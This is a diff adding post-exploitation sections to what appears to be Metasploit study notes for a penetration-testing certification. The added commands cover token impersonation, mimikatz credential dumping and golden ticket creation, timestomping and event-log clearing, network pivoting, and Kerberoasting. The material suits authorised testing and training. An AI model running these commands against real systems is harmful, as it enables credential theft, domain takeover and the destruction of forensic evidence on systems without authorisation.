@@ -204,6 +204,131 @@ run post/multi/recon/local_exploit_suggester
 
 ---
 
+## 🧪 Meterpreter advanced — token impersonation, anti-forensics, pivoting
+
+### `load incognito` — token stealing (CEH classic)
+
+When you're NT AUTHORITY\SYSTEM but need to act AS a specific user (e.g. a logged-in domain admin whose token is in memory):
+
+```text
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > load incognito
+meterpreter > list_tokens -u
+Delegation Tokens Available
+===========================
+CORP\Administrator
+CORP\alice
+
+meterpreter > impersonate_token "CORP\\Administrator"
+[+] Delegation token available
+[+] Successfully impersonated user CORP\Administrator
+
+meterpreter > getuid
+Server username: CORP\Administrator
+
+meterpreter > rev2self                  # drop back to original
+```
+
+Note the **double backslash** in `impersonate_token` — single backslash fails silently.
+
+### Token stealing without incognito
+```text
+meterpreter > steal_token <PID>         # steal token of a running process
+meterpreter > rev2self                  # revert
+meterpreter > getsystem                 # try multiple privesc methods to SYSTEM
+```
+
+### `load kiwi` — mimikatz built-in
+```text
+meterpreter > load kiwi
+meterpreter > creds_all                 # dump ALL: plaintexts, NTLM, Kerberos
+meterpreter > kerberos_ticket_list
+meterpreter > golden_ticket_create -d corp.local -k <krbtgt_hash> \
+    -s <domain_sid> -u Administrator -t /tmp/gold.kirbi
+meterpreter > lsa_dump_sam              # local SAM
+meterpreter > lsa_dump_secrets          # LSA secrets
+meterpreter > kiwi_cmd "sekurlsa::logonpasswords"   # raw mimikatz
+```
+
+### Anti-forensics
+```text
+meterpreter > timestomp file.txt -v     # view MACB times
+meterpreter > timestomp file.txt -f reference.txt   # copy times from reference
+meterpreter > timestomp file.txt -m "01/01/2020 10:00:00"   # set modified
+meterpreter > timestomp file.txt -b     # blank (zero out)
+meterpreter > clearev                   # clear Windows event logs
+```
+
+### Port forwarding / pivoting
+```text
+meterpreter > portfwd add -l 8888 -p 3389 -r 10.10.10.5
+# Now RDP to your own 127.0.0.1:8888 → hits internal 10.10.10.5:3389
+
+meterpreter > portfwd list
+meterpreter > portfwd delete -l 8888 -p 3389 -r 10.10.10.5
+meterpreter > portfwd flush
+
+# Route internal subnet through session (for msf auxiliary modules to reach it)
+meterpreter > run autoroute -s 10.10.20.0/24
+meterpreter > run autoroute -p              # list routes
+
+# From msfconsole: SOCKS proxy for external tools
+msf6 > use auxiliary/server/socks_proxy
+msf6 > run -j
+# then: proxychains nmap -sT 10.10.20.5
+```
+
+---
+
+## 🧩 Console control: resource, makerc, spool
+
+| Command | Meaning |
+|---|---|
+| `resource <path/file.rc>` | Execute a file of msf commands (like a script) |
+| `makerc <path/file.rc>` | **Save** the last N commands as a resource script |
+| `spool <path/log.txt>` | **Log** everything printed to console to a file (`spool off` stops) |
+| `save` | Save current settings to `~/.msf4/config` |
+| `connect <IP> <port>` | Netcat-like TCP client from within msfconsole |
+| `irb` | Drop into Ruby interactive shell (module internals) |
+| `sessions -C "<cmd>"` | Run a command across all meterpreter sessions |
+
+```bash
+# Record a session then replay
+msf6 > spool session.log
+msf6 > use exploit/multi/handler
+msf6 > ...
+msf6 > makerc handler.rc
+msf6 > spool off
+
+# Next time
+msfconsole -q -r handler.rc
+```
+
+---
+
+## 🎟 Kerberoast / AD post-ex in Metasploit
+
+```text
+msf6 > use auxiliary/gather/get_user_spns
+msf6 > set RHOSTS <DC_IP>
+msf6 > set DOMAIN corp.local
+msf6 > set USER alice
+msf6 > set PASS Pass123
+msf6 > run
+# TGS-REP hashes printed and stored in creds; crack with hashcat -m 13100
+
+# AS-REP roast
+msf6 > use auxiliary/gather/asrep_roast
+msf6 > set USER_FILE users.txt
+msf6 > set RHOSTS <DC_IP>
+msf6 > run
+# crack with hashcat -m 18200
+```
+
+---
+
 ## ⚠️ Gotchas
 
 - **LHOST is YOUR IP**, not the target. Check `ip a` for your tun0/eth0 address before setting.
